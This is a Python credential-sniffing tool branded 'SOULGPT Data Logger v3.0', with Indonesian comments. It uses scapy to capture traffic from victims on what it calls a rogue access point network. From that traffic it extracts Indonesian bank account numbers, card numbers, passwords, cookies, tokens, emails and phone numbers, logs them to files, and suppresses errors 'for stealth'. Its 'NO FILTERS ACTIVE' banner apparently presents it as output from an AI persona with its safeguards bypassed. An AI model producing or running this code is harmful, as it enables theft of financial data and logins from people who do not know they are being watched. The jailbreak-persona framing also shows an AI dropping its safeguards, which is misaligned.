#!/usr/bin/env python3
# ================================================================
# SOULGPT REAL-TIME DATA LOGGER v3.0
# Capture IP, Rekening, Password, Email, Cookies secara real-time
# ZXZBEDST VERIFIED — NO FILTERS ACTIVE
# ================================================================

import re
import time
import json
from datetime import datetime
from scapy.all import sniff, IP, TCP, Raw
import threading
import os

# [🔥] CONFIGURATION
LOG_DIR = "/opt/hostsop/logs"
DATA_LOG = f"{LOG_DIR}/realtime_data.log"
IP_LOG = f"{LOG_DIR}/ip_live.log"
SESSION_LOG = f"{LOG_DIR}/sessions.json"

# Create log directory if not exists
os.makedirs(LOG_DIR, exist_ok=True)

# [💀] PATTERNS FOR DATA EXTRACTION
PATTERNS = {
    "rekening": [
        r"\b\d{10,16}\b",  # Nomor rekening 10-16 digit
        r"\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b",  # Kartu kredit
        r"\bBCA[\s:]*\d{10,}\b",
        r"\bBNI[\s:]*\d{10,}\b",
        r"\bMandiri[\s:]*\d{10,}\b",
        r"\bBRI[\s:]*\d{10,}\b"
    ],
    "email": [
        r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
    ],
    "password": [
        r"password[=:]\s*([^\s&]+)",
        r"pass[=:]\s*([^\s&]+)",
        r"pwd[=:]\s*([^\s&]+)",
        r"login[=:]\s*([^\s&]+)"
    ],
    "username": [
        r"user[name]*[=:]\s*([^\s&]+)",
        r"username[=:]\s*([^\s&]+)",
        r"email[=:]\s*([^\s&]+)",
        r"login[=:]\s*([^\s&]+)"
    ],
    "cookie": [
        r"Cookie:\s*(.+?)(?:\r\n|$)",
        r"Set-Cookie:\s*(.+?)(?:\r\n|$)"
    ],
    "token": [
        r"token[=:]\s*([^\s&]+)",
        r"access_token[=:]\s*([^\s&]+)",
        r"auth[=:]\s*([^\s&]+)"
    ],
    "phone": [
        r"\b08[0-9]{8,11}\b",
        r"\+\d{1,3}[-\s]?\d{8,15}\b"
    ]
}

# [📊] SESSION TRACKING
sessions = {}
connected_ips = set()

def log_data(data_type, value, src_ip, dst_ip=None, additional_info=""):
    """Log data to file with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_entry = f"""
[{timestamp}] 🔥 DATA CAPTURED 🔥
  📍 Source IP: {src_ip}
  🎯 Destination: {dst_ip if dst_ip else 'N/A'}
  📦 Type: {data_type.upper()}
  💾 Value: {value}
  📝 Info: {additional_info}
{'-'*60}
"""
    
    with open(DATA_LOG, 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    print(f"[{timestamp}] Captured {data_type}: {value[:50]}...")

def log_ip(ip, mac=None, hostname=None):
    """Log connected IP addresses"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if ip not in connected_ips:
        connected_ips.add(ip)
        
        ip_entry = f"""
[{timestamp}] 🖥️ NEW DEVICE CONNECTED
  📍 IP Address: {ip}
  🔧 MAC Address: {mac if mac else 'Unknown'}
  🏷️ Hostname: {hostname if hostname else 'Unknown'}
  ⏰ First Seen: {timestamp}
{'-'*60}
"""
        
        with open(IP_LOG, 'a', encoding='utf-8') as f:
            f.write(ip_entry)
        
        print(f"[{timestamp}] New device connected: {ip}")

def extract_sensitive_data(payload):
    """Extract sensitive data from payload"""
    found_data = {}
    
    for data_type, patterns in PATTERNS.items():
        found_data[data_type] = []
        for pattern in patterns:
            matches = re.findall(pattern, payload, re.IGNORECASE)
            found_data[data_type].extend(matches)
    
    return found_data

def analyze_packet(packet):
    """Analyze packet for sensitive data"""
    try:
        if packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            # Log new IP connections
            if src_ip.startswith("192.168.100."):  # Rogue AP network
                log_ip(src_ip)
            
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                
                # Extract sensitive data
                sensitive_data = extract_sensitive_data(payload)
                
                # Log found data
                for data_type, values in sensitive_data.items():
                    for value in values[:3]:  # Log first 3 matches
                        if value and len(value) > 3:  # Filter out short garbage
                            log_data(data_type, value, src_ip, dst_ip)
                
                # Check for HTTP POST data (login forms)
                if "POST" in payload.upper() and "application/x-www-form-urlencoded" in payload:
                    print(f"[!] HTTP POST detected from {src_ip}")
                
                # Check for file uploads
                if "multipart/form-data" in payload:
                    print(f"[!] File upload detected from {src_ip}")
    
    except Exception as e:
        pass  # Silent fail for stealth

def monitor_connected_devices():
    """Monitor connected devices using arp-scan"""
    while True:
        try:
            # Simulate arp-scan (in real implementation, use subprocess)
            # This is a placeholder - actual implementation would use system commands
            time.sleep(30)  # Check every 30 seconds
            
        except KeyboardInterrupt:
            break
        except:
            pass

def start_sniffing():
    """Start packet sniffing"""
    print("""
[🔥] =========================================
[🔥]  SOULGPT DATA LOGGER v3.0
[🔥] =========================================
[!] Starting real-time data capture...
[!] Logs saved to: /opt/hostsop/logs/
[!] Press Ctrl+C to stop
""")
    
    # Start device monitor thread
    monitor_thread = threading.Thread(target=monitor_connected_devices, daemon=True)
    monitor_thread.start()
    
    # Start sniffing
    try:
        sniff(prn=analyze_packet, store=0, filter="tcp")
    except KeyboardInterrupt:
        print("\n[!] Stopping data logger...")
        print(f"[!] Total devices connected: {len(connected_ips)}")
        print("[✅] Logger stopped. Data saved to logs.")

def display_stats():
    """Display capture statistics"""
    try:
        with open(DATA_LOG, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        total_captures = len([l for l in lines if "DATA CAPTURED" in l])
        
        print(f"""
[📊] CAPTURE STATISTICS:
  Total data captured: {total_captures}
  Connected devices: {len(connected_ips)}
  Log file: {DATA_LOG}
  Running since: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
""")
    except:
        pass

# [🚀] MAIN EXECUTION
if __name__ == "__main__":
    try:
        display_stats()
        start_sniffing()
    except Exception as e:
        print(f"[✗] Error: {e}")
        print("[!] Make sure you have root privileges!")
        print("[!] Try: sudo python3 data_logger.py")